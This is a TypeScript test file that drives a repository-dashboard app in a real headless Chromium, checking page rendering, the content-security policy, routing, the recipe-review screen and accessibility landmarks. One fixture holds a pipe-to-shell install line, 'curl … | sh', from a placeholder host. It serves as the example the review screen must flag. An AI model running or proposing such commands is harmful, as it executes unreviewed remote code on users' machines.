// The dashboard, in a real browser, over a real socket — the other half of M6f.
//
// `test/web.test.ts` asserts the strings the renderers return, and it is the right test for
// what it covers. It cannot cover this: a page whose markup is correct in a string can still
// arrive as a 500, render into quirks mode, throw in the browser before the reader sees
// anything, or link somewhere the router does not answer. Every one of those is invisible to
// a function that never leaves the process.
//
// So this drives the product the way a person does. Real `startStatusServer`, real
// `dashboardRoutes`, real HTTP on a real port, and this repository's OWN `src/browser.ts` —
// no puppeteer, no playwright, per ADR-0006's v1.5 amendment. The evidence page is built by
// folding `demoRunEvents` through the real `fold` and `confidence`, so what is rendered is
// what a genuine Tier 1 log produces rather than a hand-written page shape.
//
// SINCE 10i, IT CARRIES MORE. The pages are no longer strings this process built: they are
// a React bundle fetching the JSON surface, which means a browser is now the ONLY place
// several things can be checked at all — that the Content-Security-Policy this repository
// serves does not block the scripts it also serves, that a `pushState` route resolves to a
// view, that a fetch reaches an API on the same origin with its cookie. `renderToStaticMarkup`
// in `test/screens.test.tsx` covers what the screens SAY; nothing but this covers whether
// they arrive.
//
// Which raises the stakes on the skip below. This file already skipped without a Chromium;
// it now also skips without a built `web/out`, and both say exactly what is missing.
//
// Three things here are deliberate and easy to undo by accident:
//
//   1. **`browser.console()` is the load-bearing assertion.** `navigate()` resolves happily
//      for a 500 and for a page that failed to fetch half of itself. The console is the only
//      signal here that tells a served document from a broken one — with one measured limit,
//      recorded on the assertion itself: `src/browser.ts` does not subscribe to
//      `Runtime.exceptionThrown`, so an uncaught page exception is invisible to it. `visit()`
//      checks the title for that reason, rather than trusting the console alone.
//   2. **`ENGINE_CHROMIUM` is scoped to this file.** `test/tools.test.ts` asserts a browser
//      is ABSENT — "a tool result, not a dead process" — so exporting this globally would
//      invert that test rather than fail it. Set in `beforeAll`, restored in `afterAll`.
//   3. **Port 9222 is hardcoded in `src/browser.ts` and is global.** Hence
//      `describe.sequential`, one browser for the file, and a skip when something else
//      already holds the port.

import { execFileSync } from 'node:child_process';
import { createServer } from 'node:http';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { Db } from '../src/store.js';
import { afterAll, beforeAll, describe, expect, test } from 'vitest';
// TYPE ONLY, and that is load-bearing. `src/browser.ts` reads `ENGINE_CHROMIUM` into a
// module-level `const` at import time, so a static import here would freeze the default
// `/usr/bin/chromium-browser` before `beforeAll` ever runs. The class is pulled in with a
// dynamic import once the environment is set; the type is erased and costs nothing.
import type { Browser } from '../src/browser.js';
import { demoRunEvents, DEMO_RUN_ID } from '../src/fixtures/demo-run.js';
import { projectRun } from '../src/projection.js';
import { dashboardRoutes } from '../src/routes.js';
import { chain, startStatusServer, type StatusServer } from '../src/sse.js';
import { DEFAULT_BUNDLE, staticRoutes } from '../src/static.js';

// ---------------------------------------------------------------------------------------
// The fixture database.
// ---------------------------------------------------------------------------------------

const REPO = 'acme/widgets';
const UNONBOARDED = 'acme/legacy';
const INSTALL_URL = 'https://github.com/apps/test-framework-fixture/installations/new';

/**
 * The row `run_projection` would hold for the demo run.
 *
 * Derived rather than authored, so the list view and the evidence view cannot disagree with
 * the log they are both supposedly about. The repository and issue are overridden because
 * the fixture's `thread_ref` is a Slack thread, which `splitThreadRef` reads as `(unknown)#0`
 * — true of that log, and useless as the subject of a page about a GitHub repository.
 */
const RUN_ROW = { ...projectRun(demoRunEvents)!, repo: REPO, issue_number: 41 };

const INSTALLATIONS = [
  {
    repo: REPO,
    installation_id: 987654,
    account: 'acme',
    connected_at: '2026-08-01T09:00:00.000Z',
    removed_at: null,
  },
  {
    repo: UNONBOARDED,
    installation_id: 987655,
    account: 'acme',
    connected_at: '2026-08-02T09:00:00.000Z',
    removed_at: null,
  },
];

const RECIPE = { install: 'npm ci', services: [], test: 'npm test' };

/**
 * What an agent proposed for the un-onboarded repository.
 *
 * Carries a service with a healthcheck and a `curl … | sh` install, because both are what
 * the review screen exists to show: the order commands run in, and the one pattern that
 * should stop a reader. `test/authz.test.ts` uses the same payload as its attack.
 */
const DRAFT = {
  install: 'curl -sL https://get.example.invalid/x | sh',
  services: [{ name: 'web', command: 'npm start', port: 3000, healthcheck: 'http://127.0.0.1:3000/healthz' }],
  test: 'pytest -q',
};

const USAGE = [
  {
    run_id: DEMO_RUN_ID,
    phase: 'repro',
    turns: 6,
    input_tokens: 41_233,
    output_tokens: 3_918,
    cache_read_input_tokens: 0,
    cache_creation_input_tokens: 0,
    provider: 'openrouter',
    model: 'moonshotai/kimi-k2-thinking',
  },
];

/**
 * What the sandboxes cost (M10, 10f), in the shape a real run produces.
 *
 * TWO agent sandboxes, because every run makes two and a fixture with one would let a
 * `(run_id, phase)` key pass. And the environment build with every measure null, because
 * that is the one sandbox whose cost the platform does not report — the page has to draw
 * a dash there rather than a zero, and only a null row can show it does.
 */
const COMPUTE = [
  { run_id: DEMO_RUN_ID, sandbox_id: 'sbx-env', phase: 'env', active_cpu_ms: null, duration_ms: null, ingress_bytes: null, egress_bytes: null },
  { run_id: DEMO_RUN_ID, sandbox_id: 'sbx-repro', phase: 'agent', active_cpu_ms: 4_120, duration_ms: 186_400, ingress_bytes: 25_769, egress_bytes: 14_956 },
  { run_id: DEMO_RUN_ID, sandbox_id: 'sbx-fix', phase: 'agent', active_cpu_ms: 3_048, duration_ms: 141_200, ingress_bytes: 21_310, egress_bytes: 9_882 },
  // Non-zero egress on a SEALED phase, which is what the first hosted run actually
  // measured (8KB, 11KB, 15KB across three `deny-all` sandboxes). A fixture with zeroes
  // here would model a world where egress answers the question about the network, and it
  // does not — `SANDBOX_SEALED` does.
  { run_id: DEMO_RUN_ID, sandbox_id: 'sbx-base', phase: 'base', active_cpu_ms: 1_902, duration_ms: 26_187, ingress_bytes: 19_004, egress_bytes: 11_735 },
];

/**
 * A `Db` that dispatches on the SQL it is handed.
 *
 * `test/serve.test.ts`'s one-shape fake answers every query with the same rows, which is
 * enough for a service that asks one question. These routes ask seven — installations, the
 * run list, the recipe, the row, the log, the usage — and a fake that answered them all
 * identically would render pages out of the wrong table without failing. So the dispatch is
 * on the query text, and an unrecognised query throws rather than returning `[]`: an empty
 * result renders as "nothing yet", which is a page that passes for a query nobody wrote.
 */
const fixtureClient = (): Db => {
  const answer = (sql: string, params: unknown[]): unknown[] => {
    if (sql.includes('from installations where repo = $1')) {
      return INSTALLATIONS.filter((row) => row.repo === params[0]);
    }
    if (sql.includes('from installations where removed_at is null')) return INSTALLATIONS;
    if (sql.includes('from recipes where repo = $1')) {
      return params[0] === REPO ? [{ recipe: RECIPE }] : [];
    }
    // The onboarding GET now also asks for a draft (M6b) — neither fixture repository has
    // one, so this fixture's answer is simply "no row", the same as every other lookup
    // this repository has nothing to say about.
    // A DRAFT on the un-onboarded repository (10n), so the review stage exists in this
    // fixture. It did not: no repository here had one, so the step where somebody reads
    // commands an agent wrote and authorises them to run verbatim — the most consequential
    // screen in the product — had no browser coverage at all.
    if (sql.includes('from recipe_drafts where repo = $1')) {
      return params[0] === UNONBOARDED
        ? [{ repo: UNONBOARDED, draft: DRAFT, drafted_at: new Date('2026-09-10T09:00:00.000Z') }]
        : [];
    }
    // The drafting and proving work for a repository (10n). Nothing here has any, which is
    // the state that matters: the checklist's job on this fixture is to say what to do
    // next, not to report a job in flight.
    if (sql.includes('from jobs')) {
      return [];
    }
    if (sql.includes('from run_projection where run_id = $1')) {
      return params[0] === DEMO_RUN_ID ? [RUN_ROW] : [];
    }
    if (sql.includes('from run_projection')) {
      // `listRuns` with and without a repo filter, which is one query text apart.
      return sql.includes('where repo = $1') && params[0] !== REPO ? [] : [RUN_ROW];
    }
    if (sql.includes('from events where run_id = $1')) {
      return params[0] === DEMO_RUN_ID ? demoRunEvents : [];
    }
    if (sql.includes('from forgotten where run_id = $1')) {
      // Nothing here was ever forgotten (9e). Answered rather than thrown because the
      // run page asks on every render, and "no tombstone" is the ordinary case — but
      // answered EXPLICITLY, because the whole point of this fake is that a query
      // nobody wrote must not quietly render as "nothing yet".
      return [];
    }
    if (sql.includes('from run_usage where run_id = $1')) {
      return params[0] === DEMO_RUN_ID ? USAGE : [];
    }
    if (sql.includes('from run_compute where run_id = $1')) {
      return params[0] === DEMO_RUN_ID ? COMPUTE : [];
    }
    // The onboarding GET lists this repository's stored secret names (M10). Neither
    // fixture repository has any, and — per this fake's own rule — that is answered
    // explicitly rather than left to fall through: a page rendering "nothing stored" for
    // a query nobody wrote is exactly the false green the throw below exists to prevent.
    if (sql.includes('from repo_secrets where repo = $1')) {
      // ONE stored name, so the environment screen has something to list. An empty answer
      // renders "nothing stored yet", which is a page that passes while showing nothing —
      // and the names half of the secrets contract (names out, never values) is only
      // observable when there is a name.
      return params[0] === REPO ? [{ name: 'STRIPE_KEY' }] : [];
    }
    throw new Error(`the fixture database was asked something nobody wrote: ${sql}`);
  };
  return {
    query: async (sql: string, params: unknown[] = []) => {
      const rows = answer(sql, params);
      return { rows, rowCount: rows.length };
    },
  } as unknown as Db;
};

/**
 * The favicon is now the bundle's own (`web/app/icon.svg`), and this test used to supply it.
 *
 * The note that stood here said Chrome asks every origin for `/favicon.ico`, gets a 404, and
 * writes "Failed to load resource" into the console — which would make the one assertion in
 * this file that can tell a rendered page from a broken one fail on every page, for a reason
 * that is not about the page. It was answered HERE, in the test, and the gap reported rather
 * than fixed. 10i fixed it: the app declares an icon, Next emits the `<link rel="icon">`, and
 * `staticRoutes` serves it. The console assertion is now a signal about the product rather
 * than about this file's scaffolding.
 */

// ---------------------------------------------------------------------------------------
// The browser, and the conditions under which there is one.
// ---------------------------------------------------------------------------------------

/** Where a real Chromium lives, in the order worth trying. */
const CANDIDATES = [
  process.env.ENGINE_CHROMIUM_BIN,
  '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  '/Applications/Chromium.app/Contents/MacOS/Chromium',
  '/usr/bin/chromium-browser',
  '/usr/bin/chromium',
  '/usr/bin/google-chrome',
].filter((path): path is string => typeof path === 'string' && path !== '');

const LAUNCHER = new URL('../scripts/headless-chromium.sh', import.meta.url).pathname;
const DEBUG_PORT = 9222;

/** True when something already holds `src/browser.ts`'s hardcoded, global debugging port. */
const portTaken = () =>
  new Promise<boolean>((resolve) => {
    const probe = createServer();
    probe.on('error', () => resolve(true));
    probe.listen(DEBUG_PORT, '127.0.0.1', () => probe.close(() => resolve(false)));
  });

let browser: Browser | null = null;
let server: StatusServer | null = null;
let base = '';
let profile = '';
/** Empty when this file really ran. Otherwise it names exactly what was absent. */
let why = '';
const previousChromium = process.env.ENGINE_CHROMIUM;
const previousBinary = process.env.ENGINE_CHROMIUM_BIN;
const previousProfile = process.env.ENGINE_CHROMIUM_PROFILE;

/** House style (`test/store.test.ts`): an explicit skip naming what is missing. */
const skipped = (subject: string): boolean => {
  if (!why) return false;
  console.log(`SKIPPED (${subject}): ${why}`);
  return true;
};

beforeAll(async () => {
  const binary = CANDIDATES.find((path) => existsSync(path));
  if (!binary) {
    why = `no Chromium on this machine — none of ${CANDIDATES.join(', ')} exists (set ENGINE_CHROMIUM_BIN)`;
    return;
  }
  if (!existsSync(LAUNCHER)) {
    why = `the launcher is missing: ${LAUNCHER}`;
    return;
  }
  // The bundle, which is a build step rather than a checkout. Named as loudly as the
  // missing-Chromium case, because "the dashboard was not built" and "the dashboard is
  // broken" produce the same blank page and only one of them is a bug.
  if (!existsSync(join(DEFAULT_BUNDLE, 'index.html'))) {
    why = `the dashboard has not been built — no ${join(DEFAULT_BUNDLE, 'index.html')}. Run \`npm run web:build\``;
    return;
  }
  if (await portTaken()) {
    why =
      `something is already listening on 127.0.0.1:${DEBUG_PORT}, which src/browser.ts hardcodes ` +
      `— close it and re-run, or these tests would drive somebody else's browser`;
    return;
  }

  profile = mkdtempSync(join(tmpdir(), 'engine-chrome-'));
  // SCOPED TO THIS FILE. `test/tools.test.ts` asserts the browser is absent; a global
  // `ENGINE_CHROMIUM` would invert that test rather than fail it.
  process.env.ENGINE_CHROMIUM = LAUNCHER;
  process.env.ENGINE_CHROMIUM_BIN = binary;
  process.env.ENGINE_CHROMIUM_PROFILE = profile;

  server = await startStatusServer({
    read: async () => [],
    port: 0,
    routes: chain(
      dashboardRoutes({ client: fixtureClient(), installUrl: INSTALL_URL }),
      // The bundle, from the same port. This is the arrangement in production — one
      // process, one origin, the API and the pages behind the same address — and testing
      // the pages against anything else would test an arrangement nobody deploys.
      staticRoutes(),
    ),
  });
  base = `http://127.0.0.1:${server.port}`;
  // Imported HERE, after the environment is set, because the module captures the binary
  // path in a `const` when it is first evaluated.
  const { Browser } = await import('../src/browser.js');
  browser = new Browser();
});

afterAll(async () => {
  // `close()` SIGKILLs the process group. Skipping it leaks a Chrome per run.
  await browser?.close();
  browser = null;
  await server?.close();
  server = null;
  if (profile) rmSync(profile, { recursive: true, force: true });
  const restore = (key: string, value: string | undefined) => {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  };
  restore('ENGINE_CHROMIUM', previousChromium);
  restore('ENGINE_CHROMIUM_BIN', previousBinary);
  restore('ENGINE_CHROMIUM_PROFILE', previousProfile);
});

/** Every page this file loaded, so the console can be judged over all of them at the end. */
const visited: string[] = [];

/**
 * A page that throws, served on its own port.
 *
 * Not part of the dashboard — this exercises `src/browser.ts` itself, and it is here
 * rather than in `tools.test.ts` because this is the only file with a real browser in it.
 */
const throwingPage = async (): Promise<{ url: string; close: () => Promise<void> }> => {
  const one = createServer((_request, response) => {
    response.writeHead(200, { 'content-type': 'text/html' });
    response.end('<!doctype html><title>throws</title><script>notAFunction()</script><p>rendered</p>');
  });
  await new Promise<void>((done) => one.listen(0, '127.0.0.1', () => done()));
  const port = (one.address() as { port: number }).port;
  return {
    url: `http://127.0.0.1:${port}/`,
    close: () => new Promise<void>((done) => void one.close(() => done())),
  };
};

/**
 * Load a page and insist it is the page.
 *
 * The title is checked because `navigate()` reports success for a 500 exactly as it does for
 * a rendered document — `startStatusServer` answers a throwing route with `text/plain` and
 * the error message, which loads fine and has no title. Without this, every `toContain`
 * below would be asserted against an error page and most of them would simply be absent
 * from it, which reads as a content bug rather than as the route having thrown.
 */
const visit = async (path: string, wanted: RegExp): Promise<string> => {
  visited.push(path);
  await browser!.navigate(`${base}${path}`);
  // POLLED, since 10i, and the reason is the architecture rather than flakiness. The
  // document that arrives is one shell for every path; the view, the title and every word
  // below are decided after it has run and asked `/api/me`. Asserting on `navigate()`'s
  // return value would be asserting on the shell, which says the same thing for every URL.
  return settle(wanted, path);
};

/**
 * Read the page until it says what it should, or say what it said instead.
 *
 * EVERY PATTERN PASSED HERE IS CASE-INSENSITIVE, and that is a fact about the DOM rather
 * than a loosening of the assertion. `browser.text()` reads `innerText`, which applies CSS
 * `text-transform` — and this stylesheet uppercases every section heading, every tab, every
 * chip, every table header and every button, because the register's typography does. So
 * `The reproduction arm` is on the page and `THE REPRODUCTION ARM` is what comes back.
 *
 * This is not hypothetical: five assertions in this file were red on `main` for exactly
 * this reason before 10i rewrote them, and the failure reads as missing content rather
 * than as a casing difference.
 */
const settle = async (wanted: RegExp, what: string, ms = 15_000): Promise<string> => {
  const deadline = Date.now() + ms;
  let last = '';
  while (Date.now() < deadline) {
    try {
      last = await browser!.text();
      if (wanted.test(last)) return last;
    } catch {
      // The execution context was torn down by a navigation this is waiting for.
    }
    await new Promise((done) => setTimeout(done, 60));
  }
  throw new Error(`${what} never reached ${wanted}; the page reads: ${last.replace(/\s+/g, ' ').slice(0, 400)}`);
};

/**
 * Click a link and wait for wherever it goes.
 *
 * `Browser` has no `waitForNavigation` — deliberately, it is a tool surface for an agent —
 * so arrival is detected by reading the page until it says what the destination says.
 * `text()` can throw mid-navigation, when the old execution context is gone and the new one
 * has not arrived; that is the wait, not a failure.
 */
const clickThrough = async (selector: string, until: RegExp, path: string): Promise<string> => {
  visited.push(path);
  await browser!.click(selector);
  const deadline = Date.now() + 10_000;
  let last = '';
  while (Date.now() < deadline) {
    try {
      last = await browser!.text();
      if (until.test(last)) return last;
    } catch {
      // The context was torn down by the navigation this is waiting for.
    }
    await new Promise((done) => setTimeout(done, 50));
  }
  throw new Error(`clicking ${selector} never reached ${until}; the page reads: ${last.slice(0, 300)}`);
};

/** `text(selector)` answers `'missing'` for a selector that matches nothing — a DOM query. */
const MISSING = 'missing';

describe.sequential('the dashboard, driven in a real browser', () => {
  test('the launcher runs the browser it was pointed at, rather than a desktop instance', () => {
    if (skipped('the launcher')) return;
    // Asserted before anything depends on it: a wrapper that silently handed off to a
    // running Chrome would fail every test below with "the browser did not come up", and
    // the cause would be four layers away from the message.
    const printed = execFileSync(process.env.ENGINE_CHROMIUM!, ['--version'], { encoding: 'utf8' });
    expect(printed).toMatch(/chrom/i);
  });

  test('the front door of a surface with no accounts is the application, not a pitch', async () => {
    if (skipped('the front door')) return;
    // `serve.ts` has one operator on 127.0.0.1 and no login. Showing them a marketing page
    // for the thing they have already installed is the landing page's worst placement, so
    // the bundle replaces `/` with `/repos` the moment `/api/me` says there are no accounts.
    //
    // That the landing page is REALLY in the document the server sent — the property a
    // crawler and a link preview depend on — is asserted in `test/static.test.ts`, which
    // reads the bytes rather than watching a browser render past them.
    await browser!.navigate(`${base}/`);
    visited.push('/');
    const page = await settle(/acme.widgets/, '/');
    expect(page).toMatch(/repositories/i);
  });

  test('the scripts it serves are allowed by the policy it serves', async () => {
    if (skipped('the policy')) return;
    // THE assertion that could not exist before 10i, and the one most likely to break
    // silently. `test/web.test.ts` guarded the old pages by asserting they contained no
    // `<script>` at all; a bundle cannot keep that, so what replaces it is a CSP with a
    // hash per inline block. Get one hash wrong — a Next upgrade that changes how the
    // flight data is emitted, a byte of whitespace — and every page is blank, with the
    // reason only in a console this is the only test that reads.
    // `acme/widgets`, not the heading — every view renders its `h1` while it is still
    // loading (so no state is headingless), which makes the title match before any data has
    // arrived. Waiting for content is what proves the bundle ran and its fetch landed.
    await visit('/repos', /acme.widgets/);
    expect(browser!.console()).not.toMatch(/Content Security Policy|refused to execute/i);
    // And the page really did run: this text exists nowhere in the shell.
    const page = await browser!.text();
    expect(page).toContain('acme/widgets');
  });

  test('a path with no file behind it resolves to a view, not to a 404', async () => {
    if (skipped('the router')) return;
    // A run id cannot be pre-rendered. `/runs/<uuid>` is not a file and never will be, so
    // the plane hands the shell out for it and the bundle decides — an arrangement that is
    // one rewrite rule away from serving `not found` for every run in the product.
    const page = await visit(`/runs/${DEMO_RUN_ID}`, /acme\/widgets#41/);
    expect(page).toMatch(/the reproduction arm/i);
  });

  test('the evidence page shows base red, fix green, the tier and every ground', async () => {
    if (skipped('the evidence page')) return;
    // TWO REQUESTS, and this waited for one. `visit` settles on the Evidence section,
    // which comes from `/evidence`; the timeline below it is built from a SEPARATE
    // `/events` read, and the assertions further down were being made before that read had
    // landed. It failed on `the run was requested` in CI and locally, at 19ms — fast
    // enough that the second request had not answered — while the live-run test asserting
    // the identical string passed, because that one waits for it.
    await visit(`/runs/${DEMO_RUN_ID}`, /the reproduction arm/i);
    const page = await settle(/the run was requested/i, 'the finished run\u2019s timeline');

    // The verdict, from the fold rather than from the row.
    expect(page).toMatch(/tier 1/i);
    expect(page).toMatch(/reproduced by a failing test/i);

    // Both arms, and the words that make the exit codes legible without colour.
    expect(page).toMatch(/the reproduction arm/i);
    expect(page).toMatch(/the regression arm/i);
    expect(page).toContain('exit 1');
    expect(page).toContain('exit 0');

    // Testimony, named as testimony (ADR-0006).
    expect(page).toMatch(/testimony/i);
    expect(page).toMatch(/input to no verdict/);

    // The timeline, which for a FINISHED run is read rather than tailed. Asserted here
    // because the two paths are easy to get backwards: this fixture's SSE `read` answers
    // with nothing at all, so a page that streamed a finished run would show "waiting for
    // the first event" under a completed verdict and every other assertion here would still
    // pass.
    expect(page).toMatch(/what happened/i);
    // Each of these is a row the timeline built from a real event in `demoRunEvents`. The
    // log ends at `PR_OPENED` — it carries no `RUN_ENDED`, which is why the projection's
    // `ended_at` is null and why the screens ask the fold's status instead.
    expect(page).toMatch(/the run was requested/i);
    expect(page).toMatch(/a reproduction was registered/i);
    expect(page).toMatch(/a pull request was opened/i);
    expect(page).toMatch(/exactly as stored/i);
    expect(page).not.toMatch(/waiting for the first event/i);

    // What the run cost, beside the log and never inside it — including the dash for the
    // environment sandbox, whose measures the platform does not report.
    expect(page).toMatch(/what this run cost/i);
    expect(page).toContain('—');
    expect(page).toMatch(/egress is not a seal check/i);
  });

  test('the repository screen puts starting a run first, and says why it cannot', async () => {
    if (skipped('the repository screen')) return;
    // The screen 10i exists for. `POST /api/runs` was built, authorized and tested in 10g
    // and nothing in the product called it.
    const page = await visit('/repos/acme/widgets', /start a run/i);
    // This deployment has no App, so the picker cannot list anything — and the screen says
    // so rather than rendering a button whose only outcome is a 501.
    expect(page).toMatch(/no GitHub App/i);
  });

  test('the tabs are a tablist, and the fragment says which one', async () => {
    if (skipped('the tabs')) return;
    await visit('/repos/acme/widgets', /start a run/i);
    const panel = await clickThrough('[role=tab]:nth-of-type(2)', /ready to test bugs/i, '/repos/acme/widgets#environment');
    // `acme/widgets` has commands in use and nothing missing, so this is the LAST step —
    // and the whole point of 10n is that a finished step offers no work, not four buttons.
    expect(panel).toMatch(/ready to test bugs/i);
    // Stored values are behind a disclosure here, which is the point: a finished step
    // offers no work. `the secrets form stores a name and a value` covers the list.
    expect(panel).toMatch(/values this project runs with/i);
  });

  test('a repository with no approved recipe opens on the tab where the work is', async () => {
    if (skipped('the unonboarded default')) return;
    // `start` was the default for EVERY repository, so the first thing somebody saw after
    // connecting one was the Start tab — the one action they cannot take yet — while the
    // recipe awaiting their approval sat behind a tab they had no reason to open. The
    // status line said "not onboarded yet" in small grey print and named no next step.
    const page = await visit(`/repos/${UNONBOARDED}`, /you are the control/i);
    // The Environment panel, not Start's issue picker.
    // And the fragment agrees, so the tab on screen is the tab the URL names — reloading
    // or sharing it lands in the same place.
    expect(page).not.toMatch(/Pick the issue to work on/i);

    // The control: an ONBOARDED repository is untouched and still opens on Start.
    expect(await visit('/repos/acme/widgets', /start a run/i)).toMatch(/Pick the issue to work on|no GitHub App/i);
  });

  test('the checklist tells a reader where they are and what to do next', async () => {
    if (skipped('the checklist')) return;
    // The whole point of 10n, driven for real: `steps()` has unit tests, and this asserts
    // the thing they cannot — that it is mounted, on the page, above the tabs, on a
    // repository that has not been onboarded.
    const page = await visit(`/repos/${UNONBOARDED}`, /check these commands/i);

    // The path, visible in full including the parts not reached — that is the value of a
    // checklist over a single "next step" line.
    expect(page).toMatch(/check the commands and use them/i);
    expect(page).toMatch(/start a run on an issue/i);
    // Exactly one step is the next action, and the words say so rather than only a colour.
    expect(page.match(/do this next/gi) ?? []).toHaveLength(1);
    // This fixture has a draft waiting, so the next thing to do is read it. `recipe` was
    // our word for these; the steps now say what they are in the reader's.
    expect(page).toMatch(/commands proposed, waiting for you to check them/i);
    expect(page).toMatch(/check the commands and use them/i);
  });

  test('approving shows the commands that will run, not a wall of JSON', async () => {
    if (skipped('the recipe review')) return;
    // The repository with a DRAFT, because that is the step where somebody reads commands
    // an agent wrote and authorises them. `acme/widgets` has commands already in use and
    // is therefore on the finished step, which offers no review to do.
    const panel = await visit(`/repos/${UNONBOARDED}`, /check these commands/i);

    // The commands, in the order the engine runs them, which is the thing the JSON could
    // not show — object keys have no order and `services` sits between phases.
    expect(panel).toMatch(/what will run, in order/i);
    expect(panel).toContain('curl -sL https://get.example.invalid/x | sh');
    expect(panel).toContain('pytest -q');
    // And what each one is for, in particular the one the engine treats as evidence.
    expect(panel).toMatch(/only thing here it treats as evidence/i);

    // THE FLAG, on the command it appears in. This is the reason the screen exists.
    expect(panel).toMatch(/worth\s+reading twice/i);
    expect(panel).toContain('| sh');

    // ADR-0013's four facts, beside the control that authorises them — which is where they
    // now live rather than on every state of the screen.
    expect(panel).toContain('verbatim');
    expect(panel).toMatch(/package\s+registry reachable/i);
    expect(panel).toMatch(/Nothing sandboxes them from that sandbox/i);
    expect(panel).toMatch(/you are the control/i);

    // ONE action. The complaint that started 10n was four submit buttons on one scroll.
    expect((panel.match(/use these commands/gi) ?? []).length).toBe(1);
    expect(panel).not.toMatch(/store this secret/i);
    expect(panel).not.toMatch(/work it out for me/i);

    // The JSON is collapsed, not gone: a draft usually needs a fix.
    expect(panel).toMatch(/edit as json/i);
    // Collapsed means its content is not rendered, which is the whole point of demoting it.
    expect(panel).not.toMatch(/are single commands, each optional/i);
  });

  test('the run register renders, and links to the run', async () => {
    // The one screen with a link to it on every page in the product, and the one the rest
    // of this file never visited.
    const page = await visit('/runs', /acme.widgets/);
    expect(page).toMatch(/tier/i);
    // And clicking through gets there, which is what makes the link a link rather than a
    // string that happens to look like one.
    const run = await clickThrough('tbody a', /the reproduction arm/i, `/runs/${DEMO_RUN_ID}`);
    expect(run).toMatch(/acme.widgets#41/);
  });

  test('the repository list shows both states, and only one of them carries the fix', async () => {
    if (skipped('the repository list')) return;
    const page = await visit('/repos', /acme.legacy/);
    expect(page).toContain('acme/widgets');
    expect(page).toContain('acme/legacy');
    expect(page).toMatch(/recipe approved/i);
    expect(page).toMatch(/not onboarded yet/i);
  });

  test('the evidence page screenshots as a real PNG', async () => {
    if (skipped('the screenshot')) return;
    await visit(`/runs/${DEMO_RUN_ID}`, /the reproduction arm/i);
    const shot = await browser!.screenshot();
    // The PNG signature, and a size that is not an empty viewport.
    expect(shot.subarray(0, 8)).toEqual(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
    expect(shot.length).toBeGreaterThan(10_000);
  });

  test('nothing on any page wrote an error to the browser console', async () => {
    if (skipped('the console')) return;
    // THE load-bearing assertion of this file. `navigate()` resolves happily for a 500 and
    // for a page that failed to fetch half of itself; the console is the only signal here
    // that tells a served document from a broken one.
    //
    // Its one measured limit, recorded on the assertion rather than in a comment nobody
    // reads: `src/browser.ts` does not subscribe to `Runtime.exceptionThrown`, so an
    // uncaught page exception is invisible to it — which is why `visit()` also insists the
    // page says what it should.
    expect(visited.length).toBeGreaterThan(4);
    const noisy = browser!
      .console()
      .split('\n')
      .filter((line) => /^\[(error|warning)\]/i.test(line));
    expect(noisy, `pages visited: ${visited.join(', ')}`).toEqual([]);
  });

  test('sees an uncaught page exception, which is the bug class the browser exists for', async () => {
    if (skipped('the throwing page')) return;
    const page = await throwingPage();
    try {
      await browser!.navigate(page.url);
      // Rendered, and the console names the throw. This is the shape of failure that a
      // string test cannot see at all: correct markup, served, and dead on arrival.
      expect(await browser!.text()).toContain('rendered');
      expect(browser!.console()).toMatch(/notAFunction|not defined|not a function/i);
    } finally {
      await page.close();
    }
  });
});

/**
 * The accessibility floor, checked in the engine that decides it.
 *
 * Not an audit — an audit is a person with a screen reader, and nothing here claims to
 * replace one. What this covers is the handful of structural facts that are cheap to break
 * and impossible to notice: a landmark that stopped being a landmark when a `<div>` was
 * substituted, a control that lost its label, a tablist that became a row of buttons, a
 * heading level skipped by a component that was moved.
 *
 * They are asserted HERE rather than over the JSX because several of them are only true of
 * the composed document — one `<main>` across the whole page, one `<h1>`, a `for` that
 * resolves to an `id` that really exists.
 */
describe.sequential('the floor, in the browser that renders it', () => {
  test('every screen has one main, one h1, and a skip link that reaches it', async () => {
    if (skipped('the landmarks')) return;
    for (const [path, wait] of [
      ['/repos', /repositories/i],
      [`/runs/${DEMO_RUN_ID}`, /the reproduction arm/i],
      ['/repos/acme/widgets', /start a run/i],
      ['/settings', /settings/i],
    ] as const) {
      await browser!.navigate(`${base}${path}`);
      visited.push(path);
      await settle(wait, path);
      // `text(selector)` answers `'missing'` for a selector that matches nothing, so each
      // of these is "this element exists and reads as it should".
      expect(await browser!.text('main#main'), `${path} has no main landmark`).not.toBe(MISSING);
      expect(await browser!.text('h1'), `${path} has no h1`).not.toBe(MISSING);
      expect(await browser!.text('a.skip'), `${path} has no skip link`).toMatch(/skip/i);
      expect(await browser!.text('header.top nav'), `${path} has no nav`).not.toBe(MISSING);
      // The one that says where you are, for a reader who cannot see the underline.
      expect(await browser!.text('header.top nav a[aria-current=page]'), `${path} marks no current section`).not.toBe(
        MISSING,
      );
    }
  });

  test('the tablist announces itself as one, with a selected tab and a labelled panel', async () => {
    if (skipped('the tablist')) return;
    await browser!.navigate(`${base}/repos/acme/widgets`);
    visited.push('/repos/acme/widgets');
    await settle(/start a run/i, '/repos/acme/widgets');
    expect(await browser!.text('[role=tablist]')).not.toBe(MISSING);
    expect(await browser!.text('[role=tab][aria-selected=true]')).toMatch(/start a run/i);
    // The panel exists and is tied to a tab. A tablist whose panel is not `aria-labelledby`
    // a tab is a set of buttons that has told a screen reader it is something else.
    expect(await browser!.text('[role=tabpanel][aria-labelledby]')).not.toBe(MISSING);
  });

  test('every input on the environment screen has a label pointing at it', async () => {
    if (skipped('the labels')) return;
    // CLICKED, not navigated to `#environment` directly. A fragment-only change on the URL
    // already loaded is a `hashchange` rather than a navigation, and CDP's `Page.navigate`
    // does not resolve for one — the test hung for thirty seconds rather than failing.
    // The repository on the REVIEW step, where the commands editor lives one disclosure
    // deep. `acme/widgets` is on the finished step, where it is two — and this test is
    // about labels, not about counting disclosures.
    await browser!.navigate(`${base}/repos/${UNONBOARDED}`);
    visited.push(`/repos/${UNONBOARDED}`);
    await settle(/check these commands/i, `/repos/${UNONBOARDED}`);
    // EXPANDED FIRST, since 10n. The recipe is reviewed as a list of the commands it will
    // run, and the JSON editor is an escape hatch inside a `<details>` — so its label is
    // hidden with its control until the disclosure is open, which is what a disclosure is
    // for. `browser.text()` reads RENDERED text and returns nothing for a collapsed one,
    // so the floor has to open it: the property is "every input has a label pointing at
    // it", not "every label is on screen at once".
    await browser!.click('.as-json > summary');
    await settle(/the commands, as json/i, 'the JSON editor');

